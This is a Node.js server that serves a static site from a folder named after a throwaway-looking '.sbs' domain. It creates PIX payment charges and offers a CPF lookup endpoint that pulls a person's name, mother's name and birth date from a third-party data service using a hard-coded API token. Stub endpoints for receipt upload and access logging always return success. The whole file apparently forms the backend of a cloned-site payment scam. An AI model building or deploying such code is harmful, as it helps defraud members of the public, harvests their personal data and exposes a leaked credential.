const fs = require("fs");
const path = require("path");

const envPath = path.join(__dirname, ".env");
try {
  require("dotenv").config({ path: envPath, override: true });
} catch {}

if (fs.existsSync(envPath)) {
  const lines = fs.readFileSync(envPath, "utf-8").split(/\r?\n/);
  for (const line of lines) {
    const cleaned = line.replace(/^\uFEFF/, "");
    const trimmed = cleaned.trim();
    if (!trimmed || trimmed.startsWith("#")) continue;
    const idx = trimmed.indexOf("=");
    if (idx === -1) continue;
    const key = trimmed.slice(0, idx).trim();
    const value = trimmed.slice(idx + 1).trim();
    if (!process.env[key]) {
      process.env[key] = value;
    }
  }
}
const http = require("http");

const PORT = process.env.PORT || 5173;
const ROOT_DIR = path.join(__dirname, "onhugbahtochnow.sbs");
const ASSET_URL = "https://api.assetpagamentos.com/functions/v1/transactions";
const ASSET_SECRET_KEY = process.env.ASSET_SECRET_KEY;
const ASSET_COMPANY_ID = process.env.ASSET_COMPANY_ID;
const POSTBACK_URL = process.env.POSTBACK_URL || "";
const CPF_API_BASE = "https://completa.workbuscas.com/api";
const CPF_API_TOKEN = process.env.CPF_API_TOKEN || "INgSeyXAXHKOyzDvPCmMqnvW";

const mimeTypes = {
  ".html": "text/html; charset=utf-8",
  ".js": "application/javascript; charset=utf-8",
  ".css": "text/css; charset=utf-8",
  ".png": "image/png",
  ".jpg": "image/jpeg",
  ".jpeg": "image/jpeg",
  ".gif": "image/gif",
  ".webp": "image/webp",
  ".svg": "image/svg+xml",
  ".ico": "image/x-icon",
  ".json": "application/json; charset=utf-8",
  ".woff2": "font/woff2",
  ".woff": "font/woff",
  ".ttf": "font/ttf",
};

function sendJSON(res, status, data) {
  res.writeHead(status, {
    "Content-Type": "application/json; charset=utf-8",
    "Access-Control-Allow-Origin": "*",
    "Access-Control-Allow-Headers": "Content-Type, Authorization",
    "Access-Control-Allow-Methods": "GET,POST,OPTIONS",
  });
  res.end(JSON.stringify(data));
}

function logError(prefix, error) {
  const message = error instanceof Error ? error.message : String(error);
  const stack = error instanceof Error && error.stack ? error.stack : "";
  console.error(prefix, message);
  if (stack) console.error(stack);
}

function parseBody(req) {
  return new Promise((resolve, reject) => {
    let body = "";
    req.on("data", (chunk) => {
      body += chunk.toString("utf-8");
    });
    req.on("end", () => {
      try {
        if (!body) return resolve({});
        const contentType = req.headers["content-type"] || "";
        if (contentType.includes("application/json")) {
          return resolve(JSON.parse(body));
        }
        if (contentType.includes("application/x-www-form-urlencoded")) {
          const params = new URLSearchParams(body);
          const obj = {};
          params.forEach((value, key) => {
            obj[key] = value;
          });
          return resolve(obj);
        }
        try {
          return resolve(JSON.parse(body));
        } catch {
          return resolve({ raw: body });
        }
      } catch (err) {
        reject(err);
      }
    });
  });
}

function sendFile(res, filePath) {
  fs.readFile(filePath, (err, data) => {
    if (err) {
      const fallbackPath = path.join(ROOT_DIR, "index.html");
      fs.readFile(fallbackPath, (fallbackErr, fallbackData) => {
        if (fallbackErr) {
          res.writeHead(404);
          res.end("Not found");
          return;
        }
        res.writeHead(200, { "Content-Type": "text/html; charset=utf-8" });
        res.end(fallbackData);
      });
      return;
    }

    const ext = path.extname(filePath).toLowerCase();
    const contentType = mimeTypes[ext] || "application/octet-stream";
    res.writeHead(200, { "Content-Type": contentType });
    res.end(data);
  });
}

function normalizeAmount(rawAmount) {
  if (rawAmount == null) return { amountCents: 100, amountNum: 1 };
  if (typeof rawAmount === "string") {
    const cleaned = rawAmount.replace(/[^\d,.-]/g, "").replace(",", ".");
    const n = parseFloat(cleaned);
    if (!Number.isFinite(n)) return { amountCents: 100, amountNum: 1 };
    return { amountCents: Math.max(1, Math.round(n * 100)), amountNum: n };
  }
  const n = Number(rawAmount);
  if (!Number.isFinite(n)) return { amountCents: 100, amountNum: 1 };
  if (Number.isInteger(n) && n >= 1000) {
    const num = n / 100;
    return { amountCents: Math.max(1, Math.round(num * 100)), amountNum: num };
  }
  return { amountCents: Math.max(1, Math.round(n * 100)), amountNum: n };
}

function extractCpfData(payload) {
  const root = payload || {};
  const base =
    root.DADOS ||
    root.dados ||
    root.data ||
    root.DadosBasicos ||
    root.dadosBasicos ||
    root.dados_basicos ||
    root;
  const nome = base.nome || base.name || "";
  const nomeMae = base.nome_mae || base.nomeMae || base.mae || "";
  const dataNasc = base.data_nascimento || base.dataNascimento || base.nascimento || "";
  const cpf = base.cpf || base.documento || base.document || "";
  return {
    cpf,
    nome,
    nome_mae: nomeMae,
    data_nascimento: dataNasc,
    sexo: base.sexo || "",
  };
}

function buildBasicAuth() {
  return Buffer.from(`${ASSET_SECRET_KEY}:${ASSET_COMPANY_ID}`).toString("base64");
}

async function createPixTransaction(body) {
  if (!ASSET_SECRET_KEY || !ASSET_COMPANY_ID) {
    throw new Error("Configure ASSET_SECRET_KEY e ASSET_COMPANY_ID no .env");
  }

  const randDigits = (len) => Array.from({ length: len }, () => Math.floor(Math.random() * 10)).join("");
  const randId = randDigits(6);
  const rawAmount = body.amount ?? body.valor ?? body.total ?? 1;
  const { amountCents, amountNum } = normalizeAmount(rawAmount);
  const customerName = (body.nome || body.name || body.customer_name || `Cliente ${randId}`).toString();
  const customerEmail = (body.email || body.customer_email || `cliente${randId}@example.com`).toString();
  const customerPhone = (body.phone || body.customer_phone || `11${randDigits(9)}`).toString().replace(/\D/g, "");
  const cpfRaw = (body.cpf || body.document || body.customer_cpf || randDigits(11)).toString().replace(/\D/g, "");
  const customerCpf = cpfRaw.padEnd(11, "0").slice(0, 11);
  const tracking = (body.tracking || body.rastreio || body.codigo || `pedido-${randId}`).toString();
  const description = "Assinatura Digital";

  const payload = {
    paymentMethod: "PIX",
    amount: amountCents,
    companyId: ASSET_COMPANY_ID,
    description: `${description} ${tracking}`,
    postbackUrl: POSTBACK_URL || undefined,
    customer: {
      name: customerName,
      email: customerEmail,
      phone: customerPhone,
      document: customerCpf,
    },
    shipping: {
      neighborhood: body.neighborhood || "Centro",
      zipCode: body.zipCode || "01001000",
      city: body.city || "Sao Paulo",
      complement: body.complement || "",
      streetNumber: body.streetNumber || "1",
      street: body.street || "Rua Exemplo",
      state: body.state || "SP",
      country: "BR",
    },
    pix: {
      expiresInDays: 1,
    },
    items: [
      {
        title: description,
        unitPrice: amountCents,
        quantity: 1,
        externalRef: `pay-${Date.now()}`,
      },
    ],
    metadata: {
      tracking,
      nome: customerName,
      cpf: customerCpf,
      generated_at: new Date().toISOString(),
      original_body: body,
    },
  };

  const basic = buildBasicAuth();
  const assetResp = await fetch(ASSET_URL, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      Authorization: `Basic ${basic}`,
    },
    body: JSON.stringify(payload),
  });

  const text = await assetResp.text();
  if (!assetResp.ok) {
    throw new Error(`Asset ${assetResp.status}: ${text || "Erro ao criar PIX"}`);
  }

  let data = {};
  try {
    data = JSON.parse(text);
  } catch {
    data = {};
  }

  const pixData = data?.pix || {};
  const brcode =
    pixData?.brcode ||
    pixData?.payload ||
    pixData?.qr_code ||
    pixData?.qrcode ||
    data?.brcode ||
    data?.payload ||
    data?.qrcode ||
    null;
  const qrcodeFinal = pixData?.qrcode || pixData?.qr_code || pixData?.payload || brcode;
  const paymentId = data?.id || data?.transactionId || null;

  return {
    success: true,
    pix_code: brcode,
    transaction_id: paymentId,
    deposit_id: paymentId,
    qrcode: qrcodeFinal,
    amount: amountNum,
    key: pixData?.key || data?.key || null,
    brcode,
    payload: brcode,
    pixCode: brcode,
    pix: {
      key: pixData?.key || data?.key || null,
      brcode,
      qrcode: qrcodeFinal,
      payload: brcode,
    },
    raw: data,
  };
}

async function checkPixStatus(id) {
  if (!ASSET_SECRET_KEY || !ASSET_COMPANY_ID) {
    throw new Error("Configure ASSET_SECRET_KEY e ASSET_COMPANY_ID no .env");
  }
  const basic = buildBasicAuth();
  const statusResp = await fetch(`${ASSET_URL}/${id}`, {
    method: "GET",
    headers: {
      Authorization: `Basic ${basic}`,
    },
  });

  const text = await statusResp.text();
  let data = {};
  try {
    data = JSON.parse(text);
  } catch {
    data = {};
  }

  if (!statusResp.ok) {
    throw new Error(text || "Erro ao consultar pagamento");
  }

  const status = data?.status || "pending";
  return {
    success: true,
    status,
    paid: status === "paid" || status === "approved",
    raw: data,
  };
}

const server = http.createServer(async (req, res) => {
  if (req.method === "OPTIONS" && req.url.startsWith("/api/")) {
    res.writeHead(204, {
      "Access-Control-Allow-Origin": "*",
      "Access-Control-Allow-Headers": "Content-Type, Authorization",
      "Access-Control-Allow-Methods": "GET,POST,OPTIONS",
    });
    res.end();
    return;
  }

  if (req.url.startsWith("/api/pix")) {
    try {
      const body = await parseBody(req);
      const response = await createPixTransaction(body);
      return sendJSON(res, 200, response);
    } catch (error) {
      logError("[PIX CREATE]", error);
      return sendJSON(res, 500, { success: false, error: String(error) });
    }
  }

  if (req.url.startsWith("/api/check-payment")) {
    try {
      const urlObj = new URL(req.url, `http://${req.headers.host}`);
      let id = urlObj.searchParams.get("id");
      if (req.method === "POST") {
        const body = await parseBody(req);
        id = body?.id || body?.paymentId || id;
      }
      if (!id) return sendJSON(res, 400, { success: false, error: "Informe o id" });
      const response = await checkPixStatus(id);
      return sendJSON(res, 200, response);
    } catch (error) {
      logError("[PIX STATUS]", error);
      return sendJSON(res, 500, { success: false, error: String(error) });
    }
  }

  if (req.url.startsWith("/api/notify-approved")) {
    return sendJSON(res, 200, { success: true });
  }

  if (req.url.startsWith("/api/consulta.php")) {
    try {
      const urlObj = new URL(req.url, `http://${req.headers.host}`);
      const cpfRaw = urlObj.searchParams.get("cpf") || "";
      const cpf = cpfRaw.replace(/\D/g, "").slice(0, 11);
      if (!cpf) return sendJSON(res, 400, { status: 400, statusMsg: "Informe o CPF" });

      const apiUrl = `${CPF_API_BASE}?token=${encodeURIComponent(CPF_API_TOKEN)}&modulo=cpf&consulta=${cpf}`;
      const apiResp = await fetch(apiUrl, { method: "GET" });
      const text = await apiResp.text();
      let data = {};
      try {
        data = JSON.parse(text);
      } catch {
        data = { raw: text };
      }

      if (!apiResp.ok) {
        return sendJSON(res, apiResp.status, data);
      }

      const dados = extractCpfData(data);
      return sendJSON(res, 200, { DADOS: dados });
    } catch (error) {
      logError("[CPF]", error);
      return sendJSON(res, 500, { status: 500, statusMsg: "Falha ao consultar CPF", details: String(error) });
    }
  }

  if (req.url.startsWith("/api/comprovantes/upload.php")) {
    return sendJSON(res, 200, { success: true });
  }

  if (req.url.startsWith("/api/log-access")) {
    return sendJSON(res, 200, { success: true });
  }

  const safePath = path
    .normalize(decodeURIComponent(req.url.split("?")[0]))
    .replace(/^(\.\.[/\\])+/, "");
  let requestedPath = safePath.replace(/^[/\\]+/, "");
  if (requestedPath === "/" || requestedPath === "") {
    requestedPath = "/index.html";
  }

  const filePath = path.join(ROOT_DIR, requestedPath);
  fs.stat(filePath, (err, stats) => {
    if (!err && stats.isDirectory()) {
      return sendFile(res, path.join(filePath, "index.html"));
    }
    return sendFile(res, filePath);
  });
});

server.listen(PORT, () => {
  console.log(`Serving on http://localhost:${PORT}`);
});
